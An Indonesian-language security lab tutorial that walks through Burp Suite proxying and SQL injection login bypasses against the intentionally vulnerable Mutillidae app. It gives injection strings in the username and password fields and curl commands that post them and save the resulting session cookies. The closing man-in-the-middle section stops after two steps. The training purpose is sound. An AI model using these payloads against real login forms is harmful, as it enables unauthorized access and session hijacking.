# Lesson 5 : SQL Injection, Burpsuite, cURL, Man-In-The-Middle Attack

## Start Web Browser Session to Mutillidae
- Buka Multilade pada browser dengan mengakses alamat http://10.0.1.100/mutillidae

## Go To Login Page
- Buka halaman Login/Register

## Configure Firefox Proxy Settings
1. View Preferences
   - Klik toggle menu yang ada di pojok kanan atas
   - Pilih Preferences
2. Advanced Settings
   - Pilih menu Advanced
   - Pilih Network Tabs
   - Klik Setting
3. Connection Settings
   - Gunakan manual proxy
   - Pada kolom HTTP Proxy isikan 127.0.0.1
   - Pada kolom Port 8080
   - Centang bagian Use the proxy server for all protocols 
   - Klik Ok, Kemudian Close

## Configure Burpsuite Settings
1. Buka Aplikasi Burpsuite
   - Akan muncul halaman aplikasi, pilih next
   - Use Burp defaults, kemudian klik start Burp
2. Configure proxy
   - Pilih tab proxy, kemudian options
   - Set port ke 8080 seperti berikut
3. Turn on intercept
   - Pilih tab intercept
   - Pastikan intercept button dalam keadaan off "intercept is off"

## SQL Injection: By-Pass Password Without Username (Obtain Access #1)
1. Login Tanpa Menggunakan Password
   - Pada kolom Textbox **Name** isikan **`' or 1=1 -- `**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol Login
2. View Post Data (With Burp Suite)
   - Klik pada Tab Proxy Tab
   - Klik pada Tab History
   - Klik cari line yang urlnya mengandung **/mutillidae/index.php?page=login.php** dengan Method POST
   - Klik pada Tab Request
   - Klik pada Tab Raw
   - Perhatikan isi string pada username, string tersbut  akan digunakan untuk melancarkan serangan

## Simulate CURL SQL Injection: (Obtain Access #1)
1. Use Curl to Login with POST Data
   - Buka terminal, ketikkan perintah-perintah berikut : 
```bash
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1+--+&password=&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login1.txt
```
```bash
grep "Logged In" login1.txt
```
```bash
cat crack_cookies.txt
```
   - Session cookies akan disimpan pada file crack_cookies.txt

## SQL Injection: Single Quote Test On Password Field (Obtain Access #2)
1. Inspect Password Box Element
   - Buka halaman Login/Register
   - Pada kolom Textbox Name isikan samurai
   - Pada kolom Textbox Password klik kanan, kemudian inspect element
2. Edit Password Box Element
   - Replace string password menjadi text
   - Pada bagian size dan maxlength tambahkan kapasistasnya dari yg semula 20 menjadi 50
3. Berikan Kondisi Selalu True pada kolom Textbox Password
   - Pada kolom Textbox Password isikan **`' or (1=1 and username='samurai')--`**
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol Login
4. View Post Data (With Burp Suite)
   - Klik pada Tab Proxy Tab
   - Klik pada Tab History
   - Klik cari line yang urlnya mengandung **/mutillidae/index.php?page=login.php** dengan Method POST
   - Klik pada Tab Request
   - Klik pada Tab Raw
   - Highligt text, kemudian klik kanan
   - Klik "Copy to FIle"
5. Save File
   - Save file di : root
   - File Name: burp2.txt
   - Klik tombol Save
6. View Post Data (With Burpsuite)
   - cd /root
   - Jalankan perintah berikut
```bash
   grep -i cookie burp2.txt
```
```bash
   grep -i username burp2.txt
```

Simulate cURL SQL Injection: (Obtain Access #2)
1. Use Curl to Login with POST Data
   - Buka terminal, ketikkan perintah-perintah berikut : 
```bash 
	rm crack_cookies.txt
```
```bash
	curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29+--+&login-php-submit-button=Login" --location "http://10.0.1.100/mutillidae/index.php?page=login.php" > login2.txt
``` 
```bash
	grep "Logged In" login2.txt
```
```bash
	cat crack_cookies.txt
```
   - Session cookies akan disimpan pada file crack_cookies.txt

## Restore Firefox Original Proxy Configurations
1. View Preferences
   - Klik toggle menu yang ada di pojok kanan atas
   - Pilih Preferences
2. Advanced Settings
   - Pilih menu Advanced
   - Pilih Network Tabs
   - Klik Setting
3. Connection Settings
   - Pilih no proxy
   - Klik Ok, Kemudian Close

## Simulate Man-In-The-Middle Attack
1. Start Cookies Manager+
2. Add Cookie Entry